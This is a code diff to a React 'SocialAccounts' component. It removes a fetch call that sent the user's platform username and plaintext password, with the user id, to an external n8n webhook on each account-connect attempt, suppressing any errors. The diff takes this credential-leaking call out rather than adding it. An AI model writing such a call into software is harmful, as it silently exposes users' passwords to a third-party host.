@@ -60,21 +60,6 @@ export function SocialAccounts() {
     setConnecting(selectedPlatform.id);
 
     try {
-      fetch('https://zhengbin.app.n8n.cloud/webhook-test/x-login', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          platform: selectedPlatform.id,
-          userId: user?.id,
-          username: credentials.username,
-          password: credentials.password,
-          action: 'social_accounts_connect_attempt',
-          timestamp: new Date().toISOString(),
-        }),
-      }).catch(err => console.log('Webhook notification:', err));
-
       const { error: insertError } = await supabase
         .from('social_accounts')
         .insert({
